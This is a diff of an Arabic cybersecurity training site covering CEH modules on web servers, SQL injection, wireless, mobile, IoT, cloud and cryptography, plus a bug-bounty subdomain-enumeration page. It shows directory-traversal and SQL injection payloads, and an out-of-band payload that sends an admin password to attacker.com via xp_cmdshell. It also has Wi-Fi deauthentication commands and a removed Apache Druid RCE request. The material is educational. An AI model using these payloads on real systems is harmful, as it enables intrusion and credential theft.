+        <p>تقسيم الـ Packets إلى أجزاء صغيرة جداً (مثل Nmap -f) لمنع الـ IDS من تجميع الـ Payload وتحليله بسرعة.</p>
+      </div>
+      <div class="goal-card" style="border-color: #ff4757;">
+        <div class="goal-icon" style="color: #ff4757;">🍯</div>
+        <h4 style="color: #ff4757;">Honeypot Detection</h4>
+        <div class="goal-subtitle">اكتشاف المصائد</div>
+        <p>اكتشاف المصائد عبر فحص الاستجابات المثالية جداً، ملفات VMware، أو قياس التأخير الزمني (Latency) بسبب التسجيل المستمر.</p>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+      
+<!-- =======================================================
+     CEH MODULE 13: HACKING WEB SERVERS
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-mod13" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">🖥️</span> Hacking Web Servers</h2>
+    <p class="hero-tagline">استغلال ثغرات خوادم الويب: تجاوز المسار، والتهيئة الخاطئة.</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-blue);"></span> Module 13</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">⚙️</span>
+      <h3>هجمات خوادم الويب (Web Server Attacks)</h3>
+    </div>
+    
+    <div class="cyber-card" style="--tool-color: #ff4757;">
+      <div class="card-header"><h4>1. تجاوز المسار (Directory Traversal)</h4></div>
+      <p>استغلال ضعف التحقق من مدخلات المستخدم للوصول لملفات حيوية خارج הـ Web Root.</p>
+      <div class="cmd-block">
+        <div class="cmd-header"><span class="cmd-lang">Payload Examples</span></div>
+        <pre><code># Linux Target
+http://example.com/download.php?file=../../../../etc/passwd
+
+# Windows Target
+http://example.com/download.php?file=..\..\..\..\Windows\System32\cmd.exe</code></pre>
+      </div>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #ffa502;">
+      <div class="card-header"><h4>2. تقسيم استجابة HTTP (HTTP Response Splitting)</h4></div>
+      <p>تمرير أحرف التحكم `
+` و `
+` داخل الـ Headers لخداع الخادم وتقسيم استجابته، مما يسمح باختطاف الجلسات أو Web Cache Poisoning.</p>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #00e5a0;">
+      <div class="card-header"><h4>3. التهيئة الخاطئة (Server Misconfiguration)</h4></div>
+      <p>ترك كلمات مرور افتراضية (Default Credentials)، تفعيل وظائف غير ضرورية، أو تمكين Verbose Error Messages التي تكشف معلومات حساسة.</p>
+    </div>
+  </div>
+
+</div>
+
+      
+<!-- =======================================================
+     CEH MODULE 14: HACKING WEB APPLICATIONS
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-mod14" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">🌐</span> Hacking Web Applications</h2>
+    <p class="hero-tagline">قائمة OWASP Top 10 وثغرات تطبيقات الويب الحرجة كـ XSS و SSRF.</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-orange);"></span> Module 14</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🐞</span>
+      <h3>الثغرات وتطبيقاتها (OWASP Top Vulnerabilities)</h3>
+    </div>
+    
+    <div class="rd-compare-grid">
+      <div class="rd-compare-col bad" style="border-color: #ff4757;">
+        <div class="rd-compare-title">⚠️ Cross-Site Scripting (XSS)</div>
+        <ul class="rd-compare-list">
+          <li><strong>Reflected:</strong> الكود في الرابط وينعكس في الاستجابة.</li>
+          <li><strong>Stored:</strong> الكود الخبيث مخزن دائم في قاعدة البيانات.</li>
+          <li><strong>DOM-based:</strong> التلاعب بالـ Document Object Model بالمتصفح.</li>
+        </ul>
+      </div>
+      <div class="rd-compare-col bad" style="border-color: #ffa502;">
+        <div class="rd-compare-title">⚠️ CSRF & SSRF & IDOR</div>
+        <ul class="rd-compare-list">
+          <li><strong>CSRF:</strong> إجبار متصفح الضحية على تنفيذ إجراءات غير مرغوب فيها باستغلال جلسته.</li>
+          <li><strong>IDOR:</strong> تغيير رقم `user_id` في الرابط للوصول لبيانات مستخدم آخر.</li>
+          <li><strong>SSRF:</strong> إجبار الخادم على إجراء طلبات نيابة عن المهاجم للوصول لشبكات داخلية.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+      
+<!-- =======================================================
+     CEH MODULE 15: SQL INJECTION
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-mod15" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">💉</span> SQL Injection (SQLi)</h2>
+    <p class="hero-tagline">حقن قواعد البيانات واستخراج البيانات بطرق مباشرة، عمياء، أو خارج النطاق.</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-red);"></span> Module 15</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🗄️</span>
+      <h3>أنواع الحقن وأمثلة البايلودز (SQLi Payloads)</h3>
+    </div>
+    
+    <div class="cyber-card" style="--tool-color: #00e5a0;">
+      <div class="card-header"><h4>1. الحقن المرئي المباشر (In-band SQLi)</h4></div>
+      <p>استخدام نفس القناة لاستقبال النتائج المباشرة.</p>
+      <div class="cmd-block">
+        <div class="cmd-header"><span class="cmd-lang">Error & Union Based</span></div>
+        <pre><code># Error-based (إجبار تحويل نص لرقم لعرض الإصدار)
+' OR 1=CONVERT(int, (SELECT @@version))--
+
+# Union-based (دمج نتائج الاستعلام لسرقة الباسوردات)
+' UNION SELECT username, password FROM users--</code></pre>
+      </div>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #ffa502;">
+      <div class="card-header"><h4>2. الحقن الاستدلالي (Blind SQLi)</h4></div>
+      <p>لا تظهر أي نتائج، يُستدل على النتيجة بسؤال النظام صح/خطأ.</p>
+      <div class="cmd-block">
+        <div class="cmd-header"><span class="cmd-lang">Boolean & Time Based</span></div>
+        <pre><code># Boolean-based (اختبار صحة شرط بولياني)
+http://example.com/item?id=1 AND 1=1 (TRUE)
+
+# Time-based (إجبار محرك القاعدة على التأخير الزمني - MySQL)
+1' AND SLEEP(10)--</code></pre>
+      </div>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #ff4757;">
+      <div class="card-header"><h4>3. الحقن خارج النطاق (Out-of-band SQLi)</h4></div>
+      <p>إجبار الخادم على إرسال البيانات المسروقة إلى خادم خارجي (DNS/HTTP) يسيطر عليه المهاجم.</p>
+      <div class="cmd-block">
+        <div class="cmd-header"><span class="cmd-lang">OOB Payload (MS SQL Server)</span></div>
+        <pre><code>'; DECLARE @data varchar(255); 
+SELECT @data=password FROM users WHERE username='admin'; 
+EXEC master..xp_cmdshell 'ping ' + @data + '.attacker.com';--</code></pre>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+      
+<!-- =======================================================
+     CEH MODULE 16: HACKING WIRELESS NETWORKS
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-mod16" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">📶</span> Wireless Networks</h2>
+    <p class="hero-tagline">اختراق الواي فاي: كسر التشفير، الهجمات الجانبية، وأدوات المراقبة المتقدمة.</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-blue);"></span> Module 16</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">📡</span>
+      <h3>بروتوكولات التشفير والهجمات (Encryption & Attacks)</h3>
+    </div>
+    
+    <div class="goal-cards-grid" dir="rtl">
+      <div class="goal-card">
+        <div class="goal-icon">🔑</div>
+        <h4>WEP Cracking</h4>
+        <div class="goal-subtitle">RC4 Vulnerability</div>
+        <p>يعتمد على 24-bit IV الذي يتكرر بسرعة. يُخترق بهجمات (FMS, PTW, Chopchop) لكسر التشفير خلال دقائق.</p>
+      </div>
+      <div class="goal-card" style="border-color: #ff4757;">
+        <div class="goal-icon" style="color: #ff4757;">🤝</div>
+        <h4 style="color: #ff4757;">WPA/WPA2 Attacks</h4>
+        <div class="goal-subtitle">4-Way Handshake</div>
+        <p>اعتراض الـ Handshake وكسر الباسورد بهجوم القاموس، أو استخدام **PMKID Attack** و **KRACK**.</p>
+      </div>
+      <div class="goal-card">
+        <div class="goal-icon">😈</div>
+        <h4>Evil Twin & Rogue AP</h4>
+        <div class="goal-subtitle">MitM Attack</div>
+        <p>نقطة وصول مزيفة تنتحل (ESSID/BSSID) للشبكة الشرعية، تُستخدم لسرقة البيانات بعد تنفيذ Deauth Attack.</p>
+      </div>
+      <div class="goal-card">
+        <div class="goal-icon">🦷</div>
+        <h4>Bluetooth Hacks</h4>
+        <div class="goal-subtitle">Bluebugging</div>
+        <p>رسائل مزعجة (Bluejacking)، سرقة بيانات (Bluesnarfing)، وسيطرة كاملة على الهاتف (Bluebugging).</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🛠️</span>
+      <h3>أرسنال الأدوات הلاسلكية (Wireless Arsenal)</h3>
+    </div>
+    <div class="cyber-card" style="--tool-color: #00e5a0;">
+      <div class="card-header"><h4>Aircrack-ng Suite</h4></div>
+      <p>الأداة الأقوى لاختراق الشبكات. تتكون من (airmon-ng) للمراقبة، (airodump-ng) لالتقاط الحزم، (aireplay-ng) للحقن، و (aircrack-ng) لكسر المفاتيح.</p>
+      <div class="cmd-block">
+        <div class="cmd-header"><span class="cmd-lang">Terminal</span></div>
+        <pre><code># تفعيل وضع المراقبة
+airmon-ng start wlan0
+
+# التقاط مصافحة WPA
+airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
+
+# هجوم Deauth لطرد العميل
+aireplay-ng -0 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon</code></pre>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+      
+<!-- =======================================================
+     CEH MODULE 17: MOBILE PLATFORMS
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-mod17" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">📱</span> Mobile Platforms</h2>
+    <p class="hero-tagline">أمن الهواتف: التجذير، ثغرات تطبيقات Android/iOS، وإدارة الـ MDM.</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-green);"></span> Module 17</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🔓</span>
+      <h3>التجذير وكسر الحماية (Rooting & Jailbreaking)</h3>
+    </div>
+    
+    <div class="rd-compare-grid">
+      <div class="rd-compare-col bad" style="border-color: #00e5a0;">
+        <div class="rd-compare-title">🤖 Android Rooting</div>
+        <ul class="rd-compare-list">
+          <li>الحصول على صلاحيات Root لكسر حماية הـ Sandboxing للتطبيقات.</li>
+          <li>من أشهر الأدوات: Magisk و SuperSU.</li>
+        </ul>
+      </div>
+      <div class="rd-compare-col bad" style="border-color: #f1c40f;">
+        <div class="rd-compare-title">🍎 iOS Jailbreaking</div>
+        <ul class="rd-compare-list">
+          <li>إزالة قيود آبل المدمجة (Code Signing & Sandboxing).</li>
+          <li>أنواع: Tethered (مقيد بحاسوب) و Untethered (غير مقيد).</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🐞</span>
+      <h3>قائمة OWASP للهواتف و MDM (Mobile Vulnerabilities)</h3>
+    </div>
+    
+    <div class="cyber-card" style="--tool-color: #ff4757;">
+      <div class="card-header"><h4>OWASP Mobile Top Threats</h4></div>
+      <p>سوء استخدام المنصة، تخزين بيانات بدون تشفير، ضعف المصادقة (Insecure Authentication)، وضعف أمان الاتصال (Lack of SSL/TLS Pinning).</p>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #00b4d8;">
+      <div class="card-header"><h4>MDM Bypass (تجاوز أنظمة المؤسسات)</h4></div>
+      <p>استغلال ثغرات بروتوكول הـ DEP للهروب من قيود تحكم المؤسسات (Wipe, Geofencing) على الأجهزة.</p>
+    </div>
+  </div>
+
+</div>
+
+      
+<!-- =======================================================
+     CEH MODULE 18: IoT & OT HACKING
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-mod18" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">🏭</span> IoT & OT Hacking</h2>
+    <p class="hero-tagline">أمن المصانع والأنظمة الحيوية: SCADA، نموذج Purdue، وبروتوكولات الـ IoT.</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-orange);"></span> Module 18</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🌐</span>
+      <h3>ثغرات إنترنت الأشياء (IoT Vulnerabilities)</h3>
+    </div>
+    
+    <div class="cyber-card" style="--tool-color: #ffa502;">
+      <p>ثغرات خطيرة في بروتوكولات مثل **MQTT** والذي يعمل غالباً بدون مصادقة وتشفير. يسمح للمهاجم بالاشتراك (Subscribe) ونشر بيانات ضارة.<br>
+      الأجهزة الضعيفة يتم تجنيدها في شبكات **Botnets** (مثل Mirai) لتنفيذ هجمات DDoS مدمرة بسبب الباسوردات الافتراضية والـ Telnet.</p>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">⚙️</span>
+      <h3>هندسة OT ونموذج Purdue (Industrial Security)</h3>
+    </div>
+    <div class="rd-compare-grid">
+      <div class="rd-compare-col good" style="border-color: #00b4d8;">
+        <div class="rd-compare-title">المستويات (Purdue Model)</div>
+        <ul class="rd-compare-list">
+          <li><strong>المستوى 0 & 1:</strong> المستشعرات والتحكم الأساسي (PLCs).</li>
+          <li><strong>المستوى 2:</strong> الإشراف والمراقبة (HMI & SCADA).</li>
+          <li><strong>المستوى 3.5:</strong> الـ Industrial DMZ العازلة.</li>
+        </ul>
+      </div>
+      <div class="rd-compare-col bad" style="border-color: #ff4757;">
+        <div class="rd-compare-title">ثغرات البروتوكولات الصناعية</div>
+        <ul class="rd-compare-list">
+          <li>بروتوكولات (Modbus و DNP3) بُنيت للسرعة لا الأمان (No Encryption).</li>
+          <li>تسمح بهجمات הـ MitM، הـ Replay، وحقن الأوامر (Command Injection).</li>
+          <li>أمثلة: فيروس Stuxnet والهجوم على شبكات كهرباء أوكرانيا.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+      
+<!-- =======================================================
+     CEH MODULE 19: CLOUD COMPUTING
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-mod19" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">☁️</span> Cloud Computing</h2>
+    <p class="hero-tagline">أمن السحابة، ثغرات الحاويات، وإدارة صلاحيات الـ IAM.</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-yellow);"></span> Module 19</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🌩️</span>
+      <h3>التهديدات السحابية الشائعة (Cloud Threats)</h3>
+    </div>
+    <div class="goal-cards-grid" dir="rtl">
+      <div class="goal-card">
+        <div class="goal-icon">⚠️</div>
+        <h4>Misconfiguration</h4>
+        <p>ترك حاويات التخزين (S3 Buckets) مفتوحة للعامة دون تصريح.</p>
+      </div>
+      <div class="goal-card">
+        <div class="goal-icon">🕷️</div>
+        <h4>SSRF Attack</h4>
+        <p>استغلال الخادم لسرقة بيانات الميتا الحساسة لـ AWS على IP (169.254.169.254).</p>
+      </div>
+      <div class="goal-card">
+        <div class="goal-icon">🔑</div>
+        <h4>IAM Escalation</h4>
+        <p>منح سياسات وصول فضفاضة مما يسمح بتصعيد الصلاحيات (Privilege Escalation).</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🐳</span>
+      <h3>ثغرات Docker و Kubernetes (Containers Flaws)</h3>
+    </div>
+    
+    <div class="rd-compare-grid">
+      <div class="rd-compare-col bad" style="border-color: #00b4d8;">
+        <div class="rd-compare-title">🐳 Docker Threats</div>
+        <ul class="rd-compare-list">
+          <li><strong>Exposed Daemon:</strong> منفذ API متاح (2375) يتيح تنفيذ أوامر كـ Root.</li>
+          <li><strong>Container Breakout:</strong> هروب المهاجم للنظام المضيف (Host OS) بسبب الإفراط في الصلاحيات.</li>
+        </ul>
+      </div>
+      <div class="rd-compare-col bad" style="border-color: #00e5a0;">
+        <div class="rd-compare-title">☸️ Kubernetes Threats</div>
+        <ul class="rd-compare-list">
+          <li><strong>Exposed Kubelet (10250):</strong> وصول غير مصرح به لتنفيذ RCE على הـ Pods.</li>
+          <li><strong>Etcd Exposure:</strong> سرقة كل الـ Secrets و الـ Keys من قاعدة بيانات الكلاستر الأساسية.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+      
+<!-- =======================================================
+     CEH MODULE 20: CRYPTOGRAPHY
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-mod20" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">🔐</span> Cryptography</h2>
+    <p class="hero-tagline">علم التشفير: التماثل، اللاتماثل، الـ PKI، وهجمات فك التشفير الرياضية.</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-red);"></span> Module 20</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🔏</span>
+      <h3>أنواع التشفير وخوارزمياته (Encryption Algorithms)</h3>
+    </div>
+    
+    <div class="rd-compare-grid">
+      <div class="rd-compare-col good" style="border-color: #00b4d8;">
+        <div class="rd-compare-title">التشفير المتماثل (Symmetric)</div>
+        <ul class="rd-compare-list">
+          <li>استخدام مفتاح واحد للتشفير وفك التشفير (سريع).</li>
+          <li><strong>AES:</strong> المعيار الذهبي الحالي، كتل بحجم 128-bit. النمط المفضل هو GCM لأمانه العالي.</li>
+          <li><strong>DES/3DES:</strong> قديم وضعيف ويجب تجنبه.</li>
+        </ul>
+      </div>
+      <div class="rd-compare-col good" style="border-color: #00e5a0;">
+        <div class="rd-compare-title">التشفير اللامتماثل (Asymmetric)</div>
+        <ul class="rd-compare-list">
+          <li>استخدام زوج من المفاتيح (Public & Private).</li>
+          <li><strong>RSA:</strong> يعتمد على الصعوبة في تحليل الأعداد الأولية (Factoring Primes).</li>
+          <li><strong>ECC:</strong> أمان قوي بمفاتيح صغيرة جداً، مثالي للموبايل والـ IoT.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🧮</span>
+      <h3>خوارزميات التجزئة والهجمات الجانبية (Hashes & Attacks)</h3>
+    </div>
+    <div class="cyber-card" style="--tool-color: #ffa502;">
+      <div class="card-header"><h4>Hash Algorithms</h4></div>
+      <p>دوال باتجاه واحد لضمان الـ Integrity. خوارزمية MD5 و SHA-1 تعتبر ضعيفة وعرضة لـ (Hash Collisions)، بينما SHA-2 و SHA-3 هما المعيار الآمن.</p>
+    </div>
+    <div class="cyber-card" style="--tool-color: #ff4757;">
+      <div class="card-header"><h4>Cryptanalysis Attacks (هجمات فك التشفير)</h4></div>
+      <p><strong>الهجمات الرياضية:</strong> (Known-Plaintext, Chosen-Ciphertext).<br>
+      <strong>الهجمات الجانبية (Side-Channel):</strong> تحليل وقت العمليات (Timing Attack) أو استهلاك الطاقة (Power Analysis) لمعرفة المفتاح.</p>
+    </div>
+  </div>
+
+</div>
+
+
+
+
+
+
+            <!-- ═══════ REDESIGN V3: Dark Hacker Components ═══════ -->
+      <div id="rd-hero-section">
+        
+        <!-- 3. Hunt Session Tracker -->
+        <div class="hunt-tracker">
+          <div class="hunt-tracker-left">
+            <div class="hunt-phase-icons">
+              <div class="hunt-phase-icon active">🌐</div>
+              <div class="hunt-phase-icon">📂</div>
+              <div class="hunt-phase-icon">💉</div>
+              <div class="hunt-phase-icon">📋</div>
+            </div>
+            <div class="hunt-progress-container">
+              <div class="hunt-progress-bar"><div class="hunt-progress-fill"></div></div>
+            </div>
+          </div>
+          <button class="start-hunt-btn">Start Hunt</button>
         </div>
 
-        <div class="cyber-card">
-          <div class="card-header"><h3>⚙️ Profiling target technology stack</h3></div>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top">whatweb --input-file=alive.txt --aggression=3 -v --color=never -o whatweb_results.txt</div>
-            <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('whatweb --input-file=alive.txt --aggression=3 -v --color=never -o whatweb_results.txt', this)">📋 Copy</button>
+        <!-- 4. Stats Dashboard -->
+        <div class="stats-dashboard">
+          <div class="stat-card">
+            <div class="stat-icon" style="color: var(--accent-secondary);">🌍</div>
+            <div class="stat-info"><span class="stat-value">15,000</span><span class="stat-label">Subdomains</span></div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-icon" style="color: var(--accent-primary);">🔗</div>
+            <div class="stat-info"><span class="stat-value">5,000</span><span class="stat-label">Endpoints</span></div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-icon" style="color: var(--accent-warning);">⚡</div>
+            <div class="stat-info"><span class="stat-value">4-6 hrs</span><span class="stat-label">Avg. Time</span></div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-icon" style="color: var(--success);">💰</div>
+            <div class="stat-info"><span class="stat-value">$12.5k</span><span class="stat-label">Total Bounty</span></div>
+          </div>
+        </div>
+
+        <!-- 5. Workflow Bar -->
+        <div class="workflow-bar">
+          <div class="workflow-step completed">✅ Scope</div>
+          <div class="workflow-arrow active">→</div>
+          <div class="workflow-step active">🌐 Recon</div>
+          <div class="workflow-arrow">→</div>
+          <div class="workflow-step">📂 Discovery</div>
+          <div class="workflow-arrow">→</div>
+          <div class="workflow-step">💉 Exploit</div>
+          <div class="workflow-arrow">→</div>
+          <div class="workflow-step">📋 Report</div>
+        </div>
+
+        <!-- 7. Breadcrumb -->
+        <div class="hacker-breadcrumb">
+          <span>Offensive Security</span>
+          <span class="separator">›</span>
+          <span>Bug Bounty</span>
+          <span class="separator">›</span>
+          <span class="active">Subdomain Enumeration</span>
+        </div>
+
+      </div>
+
+
+
+      
+                  <!-- Phase 0: Subdomain Enumeration -->
+      <div class="meth-content-view" id="meth-content-p0" style="display: block;">
+
+        <!-- Phase Header -->
+        <div class="phase-header-new" dir="rtl">
+          <div class="phase-header-top">
+            <div class="phase-icon-large">📄</div>
+            <div>
+              <h1 class="phase-title-new">Subdomain Enumeration</h1>
+              <p class="phase-subtitle-new">Build your full attack surface before touching the target — as used in real Bug Bounty</p>
+            </div>
+          </div>
+          <div class="phase-meta-row">
+            <div class="meta-pill difficulty">🟠 Medium</div>
+          </div>
+        </div>
+
+        <!-- Goal Cards -->
+        <div class="goal-cards-grid" dir="rtl">
+          <div class="goal-card what">
+            <div class="goal-card-header">ℹ️ What is it?</div>
+            <p>عملية اكتشاف كل النطاقات الفرعية<br>المرتبطة بالهدف من مصادر OSINT خارجية<br>أو DNS بنشط — بدون لمس الـ target مباشرة.</p>
+          </div>
+          <div class="goal-card goal">
+            <div class="goal-card-header">🎯 Goal</div>
+            <p>بناء أوسع Attack Surface ممكن.<br>كل subdomain = نقطة دخول: Takeover /<br>Admin panel / Dev environment / API مكشوف.</p>
+          </div>
+        </div>
+        <div class="meta-pill" style="margin-bottom: 32px; display:inline-flex; border: 1px solid #1e293b; background: transparent; color: #64748b;">
+            <span style="color:#00b4d8; margin-right:6px;">🔧</span> subfinder · amass · httpx · nuclei
+        </div>
+
+        <!-- Interactive Decision Tree -->
+        <div class="section-header-hacker">🔀 DECISION TREE — FOLLOW THE PATH <span style="color:#64748b; font-weight:normal; text-transform:none; margin-right:12px;">Interactive — انقر على إجابتك</span></div>
+        <div class="decision-tree-container" dir="rtl">
+          <div class="decision-node" style="text-align:center;">
+            هل عندك scope واضح من الـ target.com أم target.com.* ؟
+            <div class="decision-btns">
+              <button class="decision-btn yes">✓ YES</button>
+              <span style="color:#64748b; font-size:12px; margin-top:8px;">← اقرأ الـ Policy أولاً</span>
+              <button class="decision-btn no">✕ NO</button>
+            </div>
+          </div>
+          <div class="bonus-tip" style="text-align:center; background: transparent; border: none; padding: 0;">⚡ بونص: هل وجدت subdomain يظهر "NoSuchBucket" أو "Web Site not found"؟</div>
+        </div>
+
+        <!-- Tools Grid -->
+        <div class="section-header-hacker">🛠 TOOLS</div>
+        <div class="tools-hacker-grid" dir="ltr">
+          <div class="tool-hacker-card">
+            <div class="tool-h-name">subfinder</div>
+            <div class="tool-metrics"><span class="tool-metric">⚡ 95%</span><span class="tool-metric wide">🌊 Wide</span></div>
+            <div class="tool-h-desc" dir="rtl" style="text-align:right;">أسرع وأوسع تغطية — Passive OSINT</div>
+          </div>
+          <div class="tool-hacker-card">
+            <div class="tool-h-name">amass</div>
+            <div class="tool-metrics"><span class="tool-metric">⚡ 20%</span><span class="tool-metric wide">🌊 Deep</span></div>
+            <div class="tool-h-desc" dir="rtl" style="text-align:right;">الأشمل — Deep OSINT + DNS brute</div>
+          </div>
+          <div class="tool-hacker-card">
+            <div class="tool-h-name">assetfinder</div>
+            <div class="tool-metrics"><span class="tool-metric" style="color:var(--accent-primary);">⚡ 98%</span><span class="tool-metric wide">🌊 Medium</span></div>
+            <div class="tool-h-desc" dir="rtl" style="text-align:right;">سريع — crt.sh + Facebook CT</div>
+          </div>
+          <div class="tool-hacker-card">
+            <div class="tool-h-name">httpx</div>
+            <div class="tool-metrics"><span class="tool-metric">⚡ 90%</span><span class="tool-metric wide">🌊 Wide</span></div>
+            <div class="tool-h-desc" dir="rtl" style="text-align:right;">Live check + tech + status codes</div>
+          </div>
+        </div>
+
+        <!-- Commands Section -->
+        <div class="section-header-hacker">💻 COMMANDS</div>
+        <div class="hacker-terminal" dir="ltr">
+          <div class="h-term-header">
+            <div class="h-term-dots">
+              <div class="h-term-dot r"></div><div class="h-term-dot y"></div><div class="h-term-dot g"></div>
+            </div>
+            <div class="h-term-filename">subdomain-enum.sh</div>
+          </div>
+          <div class="h-term-body-wrap">
+            <div class="h-term-actions">
+              <button class="term-action-btn">📋 Copy</button>
+              <button class="term-action-btn sim">▶ Simulate</button>
+            </div>
+            <div class="h-term-body">
+              <div style="color:var(--accent-primary); margin-bottom:8px;">① Passive Collection</div>
+              <span class="hl-comment"># Passive subdomain discovery</span><br>
+              <span class="hl-cmd">subfinder</span> <span class="hl-flag">-d</span> target.com <span class="hl-flag">-all -recursive -silent -o</span> subs.txt<br>
+              <span class="hl-cmd">amass</span> enum -passive -d target.com -o amass.txt<br>
+              <span class="hl-cmd">assetfinder</span> --subs-only target.com > assetfinder.txt<br><br>
+              <span class="hl-comment"># Merge & deduplicate all sources</span><br>
+              <span class="hl-cmd" style="color:#ff4757;">cat</span> subs.txt amass.txt assetfinder.txt | <span class="hl-cmd" style="color:#ff4757;">sort</span> <span class="hl-flag">-u</span> > <span style="color:#ff4757;">all_subs.txt</span>
             </div>
           </div>
         </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Apache Druid stack profiling</h3></div>
-          <p><strong>الوصف (Scenario):</strong> تحديد إصدار لوحة تحكم Apache Druid قديمة خلال فحص بصمات التقنيات السيرفر.</p>
-          <p><strong>الاستغلال (Exploitation):</strong> رصد الباحث إصداراً مصاباً بثغرة RCE (CVE-2021-27651) واستخدم حمولة JSON لتنفيذ الأوامر.</p>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top">POST /druid/indexer/v1/sampler HTTP/1.1
-Content-Type: application/json
-
-{"type":"index","spec":{"dataSchema":{"parser":{"parseSpec":{"format":"javascript","tsColName":"timestamp","timestampSpec":{"column":"timestamp","format":"auto"},"dimensionsSpec":{},"function":"function(){java.lang.Runtime.getRuntime().exec('id')}"}}}}}</div>
-          </div>
-          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$10,000</span></p>
+        <div class="expected-output-block" dir="ltr">
+            <div class="expected-output-header">⬇ EXPECTED OUTPUT</div>
+            api.target.com<br>
+            <span style="color:var(--accent-warning);">dev.target.com &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;← HOT 🔥</span><br>
